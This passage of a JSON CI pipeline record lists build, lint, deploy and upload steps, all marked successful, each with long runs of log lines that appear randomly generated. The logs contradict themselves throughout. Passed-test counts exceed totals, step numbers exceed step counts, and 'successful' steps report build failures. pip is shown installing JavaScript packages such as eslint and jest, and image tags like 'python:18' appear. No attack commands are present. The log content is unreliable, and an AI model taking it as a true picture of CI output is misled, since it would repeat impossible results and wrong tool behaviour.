          "Artifact uploaded: dist.zip (50MB)",
          "Building Docker image...",
          "[12:47:24] DEBUG: Query executed in 39ms",
          "pip install: Successfully installed eslint-3.8",
          "npm install: added 352 packages",
          "[12:47:24] INFO: Connecting to database",
          "[12:47:24] INFO: Connecting to database",
          "Bundling vendor.css",
          "Fetching submodules...",
          "Step 16/20: Installing dependencies",
          "GET /api - 200 (24ms)",
          "Fetching submodules...",
          "[12:47:24] INFO: Request completed",
          "Finished.",
          "[12:47:24] ERROR: Connection failed",
          "Step 20/21: Linting",
          "Cache saved successfully",
          "Uploading artifact 'dist' (15 files)",
          "npm notice: created a lockfile",
          "Step 13/19: Deploying",
          "[12:47:24] INFO: Processing request",
          "\u2713 Step 'checkout' succeeded",
          "Artifact downloaded: 5MB",
          "Already up to date.",
          "WARNING: prettier has known vulnerabilities",
          "Fetching submodules...",
          "Pulling image: alpine:18",
          "pip install: Successfully installed react-4.9",
          "pip: Collecting jest",
          "pip install: Successfully installed jest-5.17",
          "npm notice: package.json updated",
          "[12:47:24] WARN: Deprecated API usage",
          "Uploading artifact 'build' (12 files)",
          "\u2713 Step 'setup' succeeded",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] DEBUG: Initializing service",
          "Loading...",
          "[12:47:24] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Waiting...",
          "WARNING: express has known vulnerabilities",
          "Waiting...",
          "Checking out main branch",
          "yarn add: Done in 5.8s",
          "pip: Collecting axios",
          "GET /status - 201 (100ms)",
          "\u2713 Task completed in 3782ms",
          "Fetching submodules...",
          "Step 9/16: Deploying",
          "Test Suites: 36 passed, 37 total",
          "Finished.",
          "Minifying app.js",
          "Uploading artifact 'coverage' (7 files)",
          "WARNING: react has known vulnerabilities",
          "[12:47:24] DEBUG: Memory usage: 1765MB",
          "  PASS: test_cache_hit (261ms)",
          "[12:47:24] DEBUG: Query executed in 52ms",
          "Test Suites: 49 passed, 41 total",
          "Snapshots: 31 passed, 30 total",
          "\u2717 build failed with exit code 9",
          "Checking out master branch",
          "NODE_ENV=development",
          "Done.",
          "Done.",
          "Artifact downloaded: 18MB",
          "Ready.",
          "[12:47:24] INFO: Request completed",
          "Connection established",
          "Pulling image: python:3.11",
          "[12:47:24] DEBUG: Query executed in 59ms",
          "Step 19/17: Linting",
          "Layer 1/13: COPY command",
          "[12:47:24] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "Success!",
          "Completed.",
          "NODE_ENV=development",
          "Fetching submodules...",
          "yarn add: Done in 16.48s",
          "Ready.",
          "[12:47:24] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (14MB)",
          "[12:47:24] DEBUG: Loading configuration",
          "[12:47:24] WARN: Deprecated API usage",
          "Optimizing 23 modules...",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Step 15/23: Linting",
          "Creating production build...",
          "Time: 18.50s",
          "FAILED: test_cache_hit",
          "Using Node.js 16.1.6",
          "npm notice: created a lockfile",
          "  PASS: integration/test_cache_hit.spec.js",
          "Artifact uploaded: dist.zip (58MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 9/16: Building",
          "WARNING: axios has known vulnerabilities",
          "Success!",
          "TLS handshake completed",
          "\u2713 Step 'test' succeeded",
          "Processing...",
          "\u2713 All checks passed",
          "Fetching from https://registry.npmjs.org/package.json",
          "npm install: resolved 1235 packages",
          "Cache hit for key-3921",
          "  PASS: integration/test_auth_login.spec.js",
          "  PASS: test_cache_hit (212ms)",
          "Step 19/24: Testing",
          "  PASS: test_user_create (296ms)",
          "Checking out main branch",
          "Step 4/18: Deploying",
          "Compiling components/service.java...",
          "\u2717 build failed with exit code 66",
          "Installing jest@1.0.8",
          "Snapshots: 12 passed, 35 total",
          "Generating source maps...",
          "\u2713 All checks passed",
          "Done.",
          "[12:47:24] INFO: Cache refreshed",
          "\u2713 Task completed in 2630ms",
          "Transforming 443 files...",
          "Image pulled successfully",
          "Fetching submodules...",
          "Using Node.js 19.5.9",
          "pip install: Successfully installed eslint-1.16",
          "[12:47:24] WARN: Deprecated API usage",
          "Using Node.js 19.0.4",
          "Artifact downloaded: 17MB",
          "Bundling runtime.js",
          "npm notice: package.json updated",
          "Compiling src/index.js...",
          "[12:47:24] DEBUG: Initializing service",
          "Fetching submodules...",
          "Step 13/22: Deploying",
          "Ready.",
          "HEAD is now at 232cd19",
          "Checking out master branch",
          "Building Docker image...",
          "[12:47:24] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "Cache miss for key-2096",
          "Pulling image: alpine:3.11",
          "Ran 46 tests in 28s",
          "Building Docker image...",
          "Pushing to registry...",
          "Tests: 204 passed, 205 total",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-26T12:49:15.413411",
        "finished_at": "2025-11-26T12:49:29.276069",
        "log_lines": [
          "=== Step: setup_node ===",
          "Tests: 259 passed, 359 total",
          "Verifying...",
          "Cache invalidated: node_modules",
          "Artifact downloaded: 26MB",
          "Uploading artifact 'coverage' (49 files)",
          "Loading...",
          "pip install: Successfully installed eslint-5.8",
          "Finished.",
          "Building Docker image...",
          "Ready.",
          "Coverage: 94% statements, 96% branches",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 4/15: Deploying",
          "Bundling main.css",
          "Loading...",
          "\u2713 Task completed in 319ms",
          "Cache hit for key-5075",
          "Success!",
          "Step 12/18: Linting",
          "npm install: resolved 1559 packages",
          "Cache miss for key-8592",
          "Compiling components/index.js...",
          "Image pulled successfully",
          "\u2713 Step 'test' succeeded",
          "Step 20/19: Linting",
          "[12:47:24] INFO: Starting build process",
          "\u2713 validate completed",
          "Minifying main.js",
          "Minifying app.js",
          "Step 10/20: Running migrations",
          "Cache restored successfully (147MB)",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] DEBUG: Loading configuration",
          "Success!",
          "Image pulled successfully",
          "Fetching submodules...",
          "Environment: development",
          "Connection established",
          "  PASS: e2e/test_auth_login.spec.js",
          "Pushing to registry...",
          "HEAD is now at c25f15e",
          "Using Python 3.12",
          "  PASS: integration/test_cache_hit.spec.js",
          "Fetching submodules...",
          "Compiling components/utils.go...",
          "Step 14/21: Running migrations",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Done.",
          "Optimizing 46 modules...",
          "[12:47:24] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Fetching from https://googleapis.com/package.json",
          "\u2713 deploy completed",
          "Done.",
          "  PASS: test_api_health (500ms)",
          "OK",
          "Step 18/25: Installing dependencies",
          "Cache saved successfully",
          "[12:47:24] DEBUG: Connection pool: 20 active",
          "Transforming 720 files...",
          "Compiling src/handler.rs...",
          "pip: Downloading webpack-1.4.tar.gz",
          "Uploading artifact 'coverage' (30 files)",
          "Pulling image: node:18",
          "Fetching submodules...",
          "Done.",
          "Uploading artifact 'build' (50 files)",
          "Transforming 222 files...",
          "Already up to date.",
          "WARNING: react has known vulnerabilities",
          "[12:47:24] WARN: Deprecated API usage",
          "Compiling utils/utils.go...",
          "pip: Downloading jest-5.0.tar.gz",
          "Compiling lib/app.ts...",
          "Pushing to registry...",
          "Cache saved successfully",
          "Verifying...",
          "\u2713 validate completed",
          "Step 11/18: Linting",
          "Step 13/20: Installing dependencies",
          "Exception: RuntimeError",
          "[12:47:24] WARN: Deprecated API usage",
          "Connection established",
          "Cache miss for key-4045",
          "Coverage: 80% statements, 68% branches",
          "\u2713 Step 'build' succeeded",
          "Step 7/18: Deploying",
          "Compiling utils/utils.go...",
          "Generating source maps...",
          "Using Python 3.11",
          "Finished.",
          "Creating production build...",
          "[12:47:24] DEBUG: Memory usage: 1241MB",
          "Bundling runtime.js",
          "  PASS: test_cache_hit (58ms)",
          "GET /status - 201 (82ms)",
          "Test Suites: 29 passed, 28 total",
          "Using Node.js 15.14.5",
          "[12:47:24] DEBUG: Query executed in 81ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:24] INFO: Connecting to database",
          "Using Node.js 18.13.10",
          "Checking out master branch",
          "  PASS: test_api_health (310ms)",
          "Cache saved successfully",
          "\u2713 Task completed in 3410ms",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "Pulling image: node:18",
          "Environment: staging",
          "OK",
          "[12:47:24] DEBUG: Connection pool: 20 active",
          "Cache saved successfully",
          "WARNING: webpack has known vulnerabilities",
          "Loading...",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "npm install: added 373 packages",
          "\u2713 Step 'install' succeeded",
          "[12:47:24] INFO: Starting build process",
          "Switched to branch 'bugfix/task-779'",
          "\u2713 All checks passed",
          "  PASS: unit/test_user_create.spec.js",
          "Environment: staging",
          "Waiting...",
          "Cache invalidated: dependencies",
          "Cache miss for key-3086",
          "npm notice: package.json updated",
          "Transforming 740 files...",
          "Checking out master branch",
          "[12:47:24] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (100MB)",
          "Uploading artifact 'coverage' (38 files)",
          "Step 6/17: Installing dependencies",
          "Step 1/17: Running migrations",
          "[12:47:24] DEBUG: Loading configuration",
          "Verifying...",
          "Pulling image: python:18",
          "[12:47:24] WARN: Deprecated API usage",
          "Done.",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:24] WARN: Deprecated API usage",
          "Compiling utils/service.java...",
          "[12:47:24] DEBUG: Memory usage: 1690MB",
          "HEAD is now at 23aef02",
          "yarn add: Done in 10.32s",
          "Completed.",
          "Ran 26 tests in 41s",
          "Using Python 3.11",
          "Ready.",
          "[12:47:24] INFO: Processing request",
          "Layer 9/12: COPY command",
          "Checking out master branch",
          "Using Python 3.11",
          "Coverage: 81% statements, 61% branches",
          "Compiling lib/index.js...",
          "Done.",
          "Processing...",
          "Uploading artifact 'build' (37 files)",
          "Environment: production",
          "  PASS: test_user_create (453ms)",
          "Coverage: 77% statements, 73% branches",
          "Finished.",
          "Switched to branch 'hotfix/task-678'",
          "Compiling lib/main.py...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-26T12:49:29.276069",
        "finished_at": "2025-11-26T12:49:43.138727",
        "log_lines": [
          "=== Step: lint ===",
          "Test Suites: 26 passed, 26 total",
          "\u2713 lint completed",
          "HEAD is now at b647418",
          "\u2713 deploy completed",
          "Checking out main branch",
          "TLS handshake completed",
          "Test Suites: 24 passed, 32 total",
          "[12:47:24] WARN: Deprecated API usage",
          "[12:47:24] DEBUG: Loading configuration",
          "[12:47:24] DEBUG: Connection pool: 8 active",
          "[12:47:24] DEBUG: Query executed in 5ms",
          "Compiling lib/index.js...",
          "Coverage: 88% statements, 94% branches",
          "[12:47:24] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "NODE_ENV=production",
          "Generating source maps...",
          "Step 10/22: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "npm notice: created a lockfile",
          "Step 16/24: Testing",
          "WARNING: webpack has known vulnerabilities",
          "Step 4/21: Building",
          "npm notice: created a lockfile",
          "[12:47:24] WARN: Deprecated API usage",
          "OK",
          "[12:47:24] INFO: Connecting to database",
          "[12:47:24] DEBUG: Query executed in 46ms",
          "Step 13/16: Testing",
          "WARNING: prettier has known vulnerabilities",
          "Minifying main.js",
          "Completed.",
          "\u2713 lint completed",
          "Cache invalidated: node_modules",
          "Connection established",
          "Coverage: 76% statements, 66% branches",
          "Platform: darwin-arm64",
          "\u2713 All checks passed",
          "Cache hit for key-9276",
          "Using Node.js 18.2.5",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "FAILED: test_cache_hit",
          "Optimizing 79 modules...",
          "Uploading artifact 'build' (21 files)",
          "Loading...",
          "Verifying...",
          "POST /data - 200 (222ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "\u2713 Task completed in 2474ms",
          "\u2713 Step 'build' succeeded",
          "Artifact uploaded: dist.zip (78MB)",
          "Artifact uploaded: dist.zip (20MB)",
          "[12:47:24] INFO: Processing request",
          "pip: Downloading jest-3.14.tar.gz",
          "Cache invalidated: node_modules",
          "Test Suites: 28 passed, 5 total",
          "POST /upload - 200 (286ms)",
          "npm install: added 358 packages",
          "Cache miss for key-2550",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Bundling styles.css",
          "Verifying...",
          "Transforming 954 files...",
          "Environment: development",
          "Step 9/16: Testing",
          "pip: Collecting react",
          "TLS handshake completed",
          "Success!",
          "[12:47:24] INFO: Processing request",
          "Completed.",
          "Step 1/16: Deploying",
          "OK",
          "OK",
          "Installing react@3.19.9",
          "Exception: TypeError",
          "Using Python 3.9",
          "NODE_ENV=test",
          "Already up to date.",
          "Fetching submodules...",
          "yarn add: Done in 24.12s",
          "Minifying app.js",
          "Step 3/25: Linting",
          "npm install: added 179 packages",
          "Step 17/18: Testing",
          "Cache restored successfully (68MB)",
          "Fetching from https://amazonaws.com/package.json",
          "Exception: TypeError",
          "Already up to date.",
          "Layer 5/12: RUN command",
          "Compiling components/app.ts...",
          "[12:47:24] DEBUG: Connection pool: 18 active",
          "Step 20/25: Linting",
          "[12:47:24] DEBUG: Connection pool: 9 active",
          "Generating source maps...",
          "Layer 3/15: COPY command",
          "Snapshots: 17 passed, 10 total",
          "Finished.",
          "npm install: added 494 packages",
          "Completed.",
          "[12:47:24] ERROR: Connection failed",
          "\u2713 Step 'install' succeeded",
          "Image pulled successfully",
          "[12:47:24] INFO: Connecting to database",
          "Test Suites: 48 passed, 20 total",
          "Verifying...",
          "  PASS: test_cache_hit (479ms)",
          "Test Suites: 47 passed, 35 total",
          "pip: Installing build dependencies...",
          "npm install: resolved 872 packages",
          "Connection established",
          "\u2713 Task completed in 3183ms",
          "pip: Downloading express-1.20.tar.gz",
          "Cache miss for key-6469",
          "Step 12/23: Testing",
          "[12:47:24] DEBUG: Connection pool: 15 active",
          "Loading...",
          "Creating production build...",
          "Step 8/16: Running migrations",
          "POST /data - 202 (17ms)",
          "Artifact uploaded: dist.zip (79MB)",
          "Step 4/20: Testing",
          "Artifact uploaded: dist.zip (56MB)",
          "POST /upload - 202 (249ms)",
          "[12:47:24] INFO: Connecting to database",
          "FAILED: test_auth_login",
          "Time: 110.12s",
          "Compiling utils/main.py...",
          "Uploading artifact 'coverage' (47 files)",
          "Compiling utils/service.java...",
          "Cache restored successfully (381MB)",
          "\u2713 Step 'build' succeeded",
          "Installing express@2.7.0",
          "[12:47:24] ERROR: Connection failed",
          "Generating source maps...",
          "Using Node.js 16.3.2",
          "  PASS: unit/test_auth_login.spec.js",
          "Using Python 3.11",
          "Waiting...",
          "[12:47:24] DEBUG: Loading configuration",
          "\u2713 Step 'checkout' succeeded",
          "Cache restored successfully (263MB)",
          "[12:47:24] INFO: Starting build process",
          "Uploading artifact 'coverage' (12 files)",
          "Ran 20 tests in 58s",
          "Checking out main branch",
          "HEAD is now at a79db7b",
          "Using Python 3.9",
          "pip install: Successfully installed eslint-2.4",
          "yarn add: Done in 16.36s",
          "HEAD is now at a027b18",
          "Ran 23 tests in 13s",
          "Cache invalidated: node_modules",
          "[12:47:24] WARN: Deprecated API usage",
          "Compiling utils/index.js...",
          "\u2713 All checks passed",
          "Step 17/24: Installing dependencies",
          "Compiling utils/index.js...",
          "Processing...",
          "npm install: resolved 462 packages",
          "[12:47:24] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Artifact downloaded: 5MB",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-26T12:49:43.138727",
        "finished_at": "2025-11-26T12:49:57.001385",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "\u2717 build failed with exit code 113",
          "Done.",
          "Tests: 296 passed, 252 total",
          "  PASS: unit/test_api_health.spec.js",
          "\u2713 Step 'checkout' succeeded",
          "Compiling utils/index.js...",
          "Tests: 397 passed, 429 total",
          "\u2713 Task completed in 3391ms",
          "Cache miss for key-1271",
          "Bundling main.js",
          "npm notice: package.json updated",
          "Compiling lib/main.py...",
          "  PASS: unit/test_cache_hit.spec.js",
          "Step 7/23: Deploying",
          "Fetching from https://amazonaws.com/package.json",
          "OK",
          "[12:47:24] WARN: Deprecated API usage",
          "Fetching from https://npmjs.org/package.json",
          "Cache saved successfully",
          "npm install: resolved 1349 packages",
          "[12:47:24] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/handler.rs...",
          "Minifying vendor.js",
          "[12:47:24] WARN: Deprecated API usage",
          "Pushing to registry...",
          "[12:47:24] ERROR: Connection failed",
          "[12:47:24] INFO: Connecting to database",
          "Snapshots: 9 passed, 42 total",
          "Tests: 88 passed, 407 total",
          "[12:47:24] ERROR: Connection failed",
          "npm notice: package.json updated",
          "Using Node.js 18.15.3",
          "Generating source maps...",
          "npm notice: package.json updated",
          "[12:47:24] DEBUG: Connection pool: 14 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2717 build failed with exit code 113",
          "Fetching from https://amazonaws.com/package.json",
          "[12:47:24] INFO: Request completed",
          "Cache saved successfully",
          "Installing lodash@3.14.8",
          "Installing jest@4.4.8",
          "[12:47:24] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Compiling utils/main.py...",
          "Cache restored successfully (353MB)",
          "Ready.",
          "Success!",
          "npm install: added 273 packages",
          "Already up to date.",
          "Installing axios@1.4.2",
          "Creating production build...",
          "Bundling runtime.css",
          "Checking out develop branch",
          "Artifact uploaded: dist.zip (9MB)",
          "Layer 9/10: COPY command",
          "Cache hit for key-3514",
          "Time: 16.500s",
          "Artifact uploaded: dist.zip (85MB)",
          "Optimizing 33 modules...",
          "Done.",
          "Processing...",
          "TLS handshake completed",
          "[12:47:24] INFO: Cache refreshed",
          "Creating production build...",
          "Fetching from https://pypi.org/package.json",
          "Step 9/23: Running migrations",
          "Compiling components/index.js...",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Layer 8/8: ENV command",
          "npm notice: package.json updated",
          "[12:47:24] INFO: Cache refreshed",
          "Compiling utils/index.js...",
          "Pulling image: alpine:3.11",
          "[12:47:24] INFO: Connecting to database",
          "  PASS: integration/test_auth_login.spec.js",
          "Coverage: 94% statements, 68% branches",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: e2e/test_api_health.spec.js",
          "Minifying app.js",
          "WARNING: jest has known vulnerabilities",
          "OK",
          "npm notice: package.json updated",
          "Pulling image: python:3.11",
          "Finished.",
          "[12:47:24] INFO: Connecting to database",
          "Fetching from https://npmjs.org/package.json",
          "\u2713 Task completed in 3289ms",
          "yarn add: Done in 22.17s",
          "  PASS: e2e/test_user_create.spec.js",
          "Ran 138 tests in 45s",
          "Minifying vendor.js",
          "  PASS: test_db_connect (407ms)",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:24] DEBUG: Memory usage: 441MB",
          "Artifact uploaded: build.tar.gz (42MB)",
          "FAILED: test_db_connect",
          "[12:47:24] DEBUG: Connection pool: 12 active",
          "[12:47:24] DEBUG: Initializing service",
          "[12:47:24] INFO: Connecting to database",
          "Bundling styles.css",
          "Step 17/21: Linting",
          "Completed.",
          "yarn add: Done in 24.63s",
          "Tests: 317 passed, 445 total",
          "Completed.",
          "Tests: 484 passed, 123 total",
          "Uploading artifact 'build' (23 files)",
          "NODE_ENV=test",
          "FAILED: test_api_health",
          "Layer 2/14: RUN command",
          "[12:47:24] DEBUG: Memory usage: 465MB",
          "Minifying app.js",
          "[12:47:24] DEBUG: Connection pool: 4 active",
          "Coverage: 91% statements, 99% branches",
          "Time: 56.236s",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=test",
          "Compiling utils/utils.go...",
          "Using Node.js 20.1.4",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (200ms)",
          "npm notice: created a lockfile",
          "[12:47:24] DEBUG: Query executed in 73ms",
          "Uploading artifact 'dist' (44 files)",
          "Using Python 3.11",
          "[12:47:24] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Generating source maps...",
          "[12:47:24] INFO: Request completed",
          "pip: Downloading lodash-3.15.tar.gz",
          "Step 6/16: Linting",
          "Step 20/22: Installing dependencies",
          "npm install: resolved 418 packages",
          "Artifact uploaded: dist.zip (94MB)",
          "NODE_ENV=test",
          "Uploading artifact 'dist' (48 files)",
          "  PASS: test_auth_login (229ms)",
          "Cache miss for key-1372",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:24] ERROR: Connection failed",
          "pip: Collecting jest",
          "Fetching submodules...",
          "Success!",
          "Finished.",
          "Coverage: 70% statements, 80% branches",
          "Cache saved successfully",
          "Fetching from https://docker.io/package.json",
          "POST /upload - 201 (468ms)",
          "OK",
          "pip: Downloading react-1.11.tar.gz",
          "Artifact uploaded: dist.zip (67MB)",
          "Step 2/15: Building",
          "Pulling image: python:3.11",
          "Cache miss for key-9631",
          "Cache saved successfully",
          "Pulling image: alpine:3.11",
          "\u2713 validate completed",
          "Already up to date.",
          "[12:47:24] WARN: Deprecated API usage",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-26T12:49:57.001385",
        "finished_at": "2025-11-26T12:50:10.864043",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "yarn add: Done in 13.90s",
          "Cache miss for key-2216",
          "Finished.",
          "Compiling utils/main.py...",
          "pip install: Successfully installed eslint-5.17",
          "Building Docker image...",
          "Environment: development",
          "Loading...",
          "pip: Installing build dependencies...",
          "Snapshots: 2 passed, 44 total",
          "[12:47:24] DEBUG: Connection pool: 1 active",
          "Loading...",
          "Uploading artifact 'build' (5 files)",
          "[12:47:24] DEBUG: Connection pool: 8 active",
          "[12:47:24] INFO: Connecting to database",
          "Coverage: 77% statements, 95% branches",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_api_health (478ms)",
          "[12:47:24] INFO: Cache refreshed",
          "TLS handshake completed",
          "Compiling utils/index.js...",
          "[12:47:24] WARN: Deprecated API usage",
          "Connection established",
          "yarn add: Done in 29.46s",
          "Environment: production",
          "Artifact downloaded: 24MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed prettier-4.4",
          "\u2713 Step 'checkout' succeeded",
          "[12:47:24] WARN: Deprecated API usage",
          "Uploading artifact 'build' (40 files)",
          "pip: Downloading react-5.8.tar.gz",
          "FAILED: test_db_connect",
          "Compiling utils/handler.rs...",
          "\u2713 Task completed in 323ms",
          "Using Node.js 14.7.5",
          "Cache miss for key-5313",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Success!",
          "Compiling src/index.js...",
          "npm install: resolved 947 packages",
          "Compiling src/handler.rs...",
          "\u2713 Step 'install' succeeded",
          "pip install: Successfully installed prettier-1.2",
          "Switched to branch 'feature/task-259'",
          "\u2713 Task completed in 4918ms",
          "Uploading artifact 'coverage' (14 files)",
          "Test Suites: 12 passed, 24 total",
          "Switched to branch 'feature/task-301'",
          "npm notice: created a lockfile",
          "\u2713 Step 'install' succeeded",
          "Already up to date.",
          "Loading...",
          "Step 5/16: Deploying",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling lib/app.ts...",
          "Step 13/18: Installing dependencies",
          "\u2713 All checks passed",
          "Step 7/20: Building",
          "Snapshots: 38 passed, 15 total",
          "[12:47:24] DEBUG: Connection pool: 16 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 18/15: Deploying",
          "Installing express@1.10.10",
          "Success!",
          "[12:47:24] DEBUG: Initializing service",
          "[12:47:24] INFO: Processing request",
          "  PASS: integration/test_user_create.spec.js",
          "pip: Collecting react",
          "[12:47:24] DEBUG: Loading configuration",
          "Using Python 3.10",
          "Artifact downloaded: 38MB",
          "Bundling styles.js",
          "Compiling components/app.ts...",
          "[12:47:24] INFO: Cache refreshed",
          "Compiling utils/handler.rs...",
          "Tests: 480 passed, 429 total",
          "Building Docker image...",
          "Finished.",
          "WARNING: eslint has known vulnerabilities",
          "Pushing to registry...",
          "Compiling lib/service.java...",
          "Using Python 3.10",
          "Success!",
          "[12:47:24] DEBUG: Memory usage: 1623MB",
          "[12:47:24] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "[12:47:24] WARN: Deprecated API usage",
          "Finished.",
          "[12:47:24] DEBUG: Loading configuration",
          "Done.",
          "Step 6/15: Running migrations",
          "\u2713 Step 'test' succeeded",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:47:24] INFO: Request completed",
          "[12:47:24] INFO: Connecting to database",
          "Test Suites: 12 passed, 22 total",
          "Exception: ValueError",
          "Bundling main.js",
          "[12:47:24] WARN: Deprecated API usage",
          "Environment: production",
          "Exception: ValueError",
          "Test Suites: 28 passed, 45 total",
          "Processing...",
          "Compiling lib/service.java...",
          "Cache invalidated: dependencies",
          "[12:47:24] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading react-1.10.tar.gz",
          "Generating source maps...",
          "pip install: Successfully installed axios-2.15",
          "Checking out master branch",
          "[12:47:24] DEBUG: Memory usage: 103MB",
          "Generating source maps...",
          "\u2717 build failed with exit code 114",
          "Test Suites: 20 passed, 38 total",
          "[12:47:24] INFO: Starting build process",
          "Cache restored successfully (58MB)",
          "Test Suites: 19 passed, 14 total",
          "Artifact uploaded: dist.zip (84MB)",
          "yarn add: Done in 13.33s",
          "Ready.",
          "Snapshots: 17 passed, 30 total",
          "[12:47:24] INFO: Starting build process",
          "Cache miss for key-4174",
          "[12:47:24] WARN: Deprecated API usage",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: created a lockfile",
          "Ran 133 tests in 25s",
          "Compiling lib/app.ts...",
          "FAILED: test_user_create",
          "Ran 32 tests in 49s",
          "Transforming 707 files...",
          "Exception: RuntimeError",
          "[12:47:24] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Cache invalidated: build",
          "WARNING: axios has known vulnerabilities",
          "Completed.",
          "Artifact downloaded: 41MB",
          "npm install: resolved 398 packages",
          "Layer 10/15: COPY command",
          "POST /upload - 202 (342ms)",
          "Ran 13 tests in 12s",
          "TLS handshake completed",
          "Pulling image: node:latest",
          "Layer 10/14: COPY command",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "Pulling image: python:18",
          "Fetching from https://pypi.org/package.json",
          "Pushing to registry...",
          "[12:47:24] INFO: Processing request",
          "Environment: staging",
          "Step 1/24: Deploying",
          "HEAD is now at 959c682",
          "OK",
          "Connection established",
          "[12:47:24] DEBUG: Memory usage: 1643MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2717 build failed with exit code 115",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-26T12:50:10.864043",
        "finished_at": "2025-11-26T12:50:24.726701",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 23 passed, 49 total",
          "[12:47:24] DEBUG: Query executed in 32ms",
          "Step 2/24: Deploying",
          "[12:47:24] INFO: Cache refreshed",
          "Step 19/19: Deploying",
          "Time: 41.642s",
          "Coverage: 88% statements, 87% branches",
          "  PASS: test_cache_hit (73ms)",
          "Transforming 239 files...",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "npm install: resolved 751 packages",
          "[12:47:24] INFO: Connecting to database",
          "Step 8/22: Running migrations",
          "npm install: resolved 617 packages",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "FAILED: test_db_connect",
          "NODE_ENV=development",
          "\u2713 package completed",
          "Processing...",
          "Tests: 458 passed, 422 total",
          "npm notice: package.json updated",
          "Completed.",
          "Artifact uploaded: dist.zip (93MB)",
          "Connection established",
          "\u2713 Step 'test' succeeded",
          "OK",
          "Using Node.js 20.16.10",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing react@2.2.5",
          "pip: Downloading webpack-5.9.tar.gz",
          "Platform: win32-x64",
          "Cache saved successfully",
          "Optimizing 30 modules...",
          "OK",
          "FAILED: test_db_connect",
          "Step 18/22: Installing dependencies",
          "Uploading artifact 'coverage' (36 files)",
          "Cache hit for key-1515",
          "Compiling src/handler.rs...",
          "Image pulled successfully",
          "NODE_ENV=production",
          "Artifact uploaded: dist.zip (4MB)",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "Installing prettier@4.16.7",
          "Layer 5/10: ENV command",
          "npm notice: created a lockfile",
          "[12:47:24] INFO: Cache refreshed",
          "[12:47:24] INFO: Starting build process",
          "Finished.",
          "HEAD is now at ce823d4",
          "HEAD is now at c37daed",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 25",
          "Transforming 754 files...",
          "[12:47:24] DEBUG: Initializing service",
          "Pushing to registry...",
          "Using Python 3.11",
          "Fetching from https://docker.io/package.json",
          "Environment: staging",
          "Step 5/23: Building",
          "Bundling main.css",
          "NODE_ENV=test",
          "pip install: Successfully installed express-3.10",
          "\u2713 Step 'test' succeeded",
          "Coverage: 77% statements, 91% branches",
          "Image pulled successfully",
          "\u2713 validate completed",
